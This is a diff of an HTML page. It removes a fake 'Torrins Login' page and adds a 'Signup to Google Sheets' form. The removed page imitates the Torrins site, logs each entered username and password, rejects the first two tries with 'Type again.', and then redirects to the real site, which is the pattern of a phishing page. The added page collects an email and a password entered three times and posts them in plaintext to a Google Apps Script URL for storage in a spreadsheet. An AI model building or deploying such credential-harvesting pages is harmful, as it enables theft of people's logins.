@@ -1,79 +1,63 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Torrins Login</title>
-  <script src="https://cdn.tailwindcss.com"></script>
+  <meta charset="utf-8">
+  <title>Signup to Google Sheets</title>
+  <style>
+    body { font-family: Arial, sans-serif; background:#f4f4f4; display:flex; justify-content:center; align-items:center; height:100vh; }
+    .box { background:#fff; padding:20px; border-radius:8px; box-shadow:0 4px 12px rgba(0,0,0,0.1); width:320px; }
+    input { width:100%; padding:10px; margin:8px 0; border:1px solid #ccc; border-radius:4px; }
+    button { width:100%; padding:10px; background:#007bff; color:#fff; border:none; border-radius:4px; cursor:pointer; }
+    button:hover { background:#0056b3; }
+    .msg { font-size:0.9rem; color:red; height:1.2rem; }
+  </style>
 </head>
-<body class="bg-gray-100 flex items-center justify-center h-screen">
-  <div class="bg-white p-8 rounded-lg shadow-lg w-full max-w-md">
-    <h2 class="text-2xl font-bold mb-6 text-center">Torrins Login</h2>
-    <div id="error-message" class="text-red-500 text-center mb-4 hidden"></div>
-
-    <form id="login-form">
-      <div class="mb-4">
-        <label for="username" class="block text-sm font-medium text-gray-700">Username</label>
-        <input 
-          type="text" 
-          id="username" 
-          name="username" 
-          class="mt-1 p-2 w-full border rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500" 
-          required
-        >
-      </div>
-      <div class="mb-4">
-        <label for="password" class="block text-sm font-medium text-gray-700">Password</label>
-        <input 
-          type="password" 
-          id="password" 
-          name="password" 
-          class="mt-1 p-2 w-full border rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500" 
-          required
-        >
-      </div>
-      <button 
-        type="submit" 
-        class="w-full bg-blue-500 text-white p-2 rounded-md hover:bg-blue-600"
-      >
-        Login
-      </button>
+<body>
+  <div class="box">
+    <h3>Create Account</h3>
+    <div id="msg" class="msg"></div>
+    <form id="form">
+      <input type="email" id="email" placeholder="Enter Email" required>
+      <input type="password" id="p1" placeholder="Enter Password" required>
+      <input type="password" id="p2" placeholder="Re-enter Password" required>
+      <input type="password" id="p3" placeholder="Enter Password Again" required>
+      <button type="submit">Submit</button>
     </form>
-
-    <p class="mt-4 text-center text-sm text-gray-600">
-      Submissions: <span id="submissions">0</span>/3
-    </p>
   </div>
 
   <script>
-    let submissions = 0;
+    const scriptURL = "PASTE_YOUR_WEB_APP_URL_HERE"; // from Google Apps Script
 
-    document.getElementById("login-form").addEventListener("submit", function(event) {
-      event.preventDefault();
+    document.getElementById("form").addEventListener("submit", function(e) {
+      e.preventDefault();
+      let email = document.getElementById("email").value;
+      let p1 = document.getElementById("p1").value;
+      let p2 = document.getElementById("p2").value;
+      let p3 = document.getElementById("p3").value;
+      let msg = document.getElementById("msg");
 
-      submissions++;
-
-      const username = document.getElementById('username').value;
-      const password = document.getElementById('password').value;
-      const errorMessage = document.getElementById('error-message');
-      const submissionsDisplay = document.getElementById('submissions');
-
-      submissionsDisplay.textContent = submissions.toString();
-
-      // Always log attempt
-      console.log(`Attempt ${submissions}: Username = "${username}", Password = "${password}"`);
-
-      if (submissions < 3) {
-        errorMessage.textContent = 'Type again.';
-        errorMessage.classList.remove('hidden');
-        document.getElementById('password').value = ''; 
-      } else {
-        errorMessage.textContent = 'Final submission received. Redirecting...';
-        errorMessage.classList.remove('hidden');
-        setTimeout(() => {
-          window.location.href = 'https://www.torrins.com/';
-        }, 2000);
+      if (p1 !== p2 || p1 !== p3) {
+        msg.textContent = "Passwords do not match!";
+        return;
       }
+      msg.textContent = "";
+
+      fetch(scriptURL, {
+        method: 'POST',
+        body: JSON.stringify({ email: email, password: p1 })
+      })
+      .then(res => res.json())
+      .then(data => {
+        if (data.result === "success") {
+          alert("Submitted successfully!");
+          document.getElementById("form").reset();
+        } else {
+          msg.textContent = "Error submitting form.";
+        }
+      })
+      .catch(err => {
+        msg.textContent = "Network error.";
+      });
     });
   </script>
 </body>
